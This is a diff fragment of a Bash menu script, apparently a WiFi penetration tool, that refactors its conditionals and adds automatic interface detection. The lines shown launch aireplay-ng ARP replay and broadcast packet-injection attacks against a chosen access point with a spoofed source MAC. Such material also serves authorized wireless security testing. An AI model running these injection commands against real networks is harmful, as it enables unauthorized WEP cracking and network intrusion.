-			if [ $rppb -gt 1000 ];then
+			if [[ $rppb -gt 1000 ]];then
 				rppb=1000
-			elif [ $rppb -lt 1 ];then
+			elif [[ $rppb -lt 1 ]];then
 				rppb=1
 			fi
 			rtech_II--;;
 
 			2) parent_III="rtech" 
-			tchan--
-			iwconfig $pii channel $tc;;
+			tchan--;;
 
 			3) echo -e "$INP\nSource MAC?"
 			read sm
@@ -3045,24 +3374,20 @@ M)ain Menu$HDR
 
 	rtech_III--()
 	{
-	if [ $rt == "1" ];then
-		st_1--
-		frag_gen--
-	elif [ $rt == "2" ];then
-		st_1--
-		chop_gen--
-	elif [ $rt == "3" ];then
-		st_1--
-		arp_out--
-	elif [ $rt == "4" ];then
-		st_1--
-		broad_out--
-	fi
+	st_1--
+	iwconfig $pii channel $tc
 
+	case $rt in
+		1) frag_gen--;;
+		2) chop_gen--;;
+		3) arp_out--;;
+		4) broad_out--;;
+	esac
+	
 	rtech--
 	}
 
-## Frag sub-functions
+	## Frag sub-functions
 	frag_gen--()
 	{
 	if [[ -z $e ]];then
@@ -3072,7 +3397,7 @@ M)ain Menu$HDR
 	fi
 	}
 
-## Chop sub-functions
+	## Chop sub-functions
 	chop_gen--()
 	{
 	if [[ -z $e ]];then
@@ -3082,11 +3407,11 @@ M)ain Menu$HDR
 	fi
 	}
 
-## ARP sub-function
+	## ARP sub-function
 	arp_out--()
 	{ Eterm -b black -f white --pause --title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
 
-## Broadcast Attack sub-function
+	## Broadcast Attack sub-function
 	broad_out--()
 	{ Eterm -b black -f white --pause --title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
 
@@ -3117,8 +3442,7 @@ M)ain Menu$HDR
 	read var
 	case $var in
 		1) parent_VI="ctech"
-		tchan--
-		iwconfig $pii channel $tc ;;
+		tchan--;;
 
 		2) echo -e "$INP\nDesired SoftAP BSSID?"
 		read b
@@ -3188,20 +3512,26 @@ venue--
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-current_ver=3.2
-rel_date="2 April 2012"
+current_ver=3.4
+rel_date="8 Jul 2012"
 envir--
-if [ "$UID" -ne 0 ];then
+if [[ "$UID" -ne 0 ]];then
 	echo -e "$WRN\nMust be ROOT to run this script"
 	exit 87
 fi
 
-if [ -z $1  ]; then
-	ie= ## Internet Connected NIC
+if [[ -z $1  ]]; then
 	phys_dev= ## Physical NIC variable
 	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
 	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
 	dev_check= ## Nulled
+
+	ie=$(route -en | grep UG | awk '{print $8}' | head -n1)
+	if [[ -n $ie ]];then
+		ie=$(ifconfig $ie | awk '{print $1}' | head -n1)
+	fi
+
+	pii=$(iwconfig | grep -i monitor | awk '{print $1}' | head -n1)
 	greet--
 else
 	usage--
